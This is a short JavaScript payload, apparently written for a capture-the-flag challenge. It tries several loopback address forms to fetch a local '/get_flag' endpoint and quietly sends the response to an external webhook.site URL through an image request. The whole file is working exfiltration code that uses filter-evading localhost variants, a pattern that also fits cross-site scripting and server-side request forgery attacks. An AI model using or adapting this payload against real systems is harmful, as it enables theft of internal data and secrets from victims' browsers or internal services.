(async () => {
  const targets = [
    'http://127.0.0.1:5000/get_flag',
    'http://127.1:5000/get_flag',
    'http://[::1]:5000/get_flag',
    'http://localhost:5000/get_flag',
  ];
  for (const u of targets) {
    try {
      const r = await fetch(u);
      if (r.ok) {
        const t = await r.text();
        new Image().src = 'https://webhook.site/0422794e-79c4-4bc8-832d-106e18ed426b/x?d=' + encodeURIComponent(t);
        break;
      }
    } catch (_) {}
  }
})();
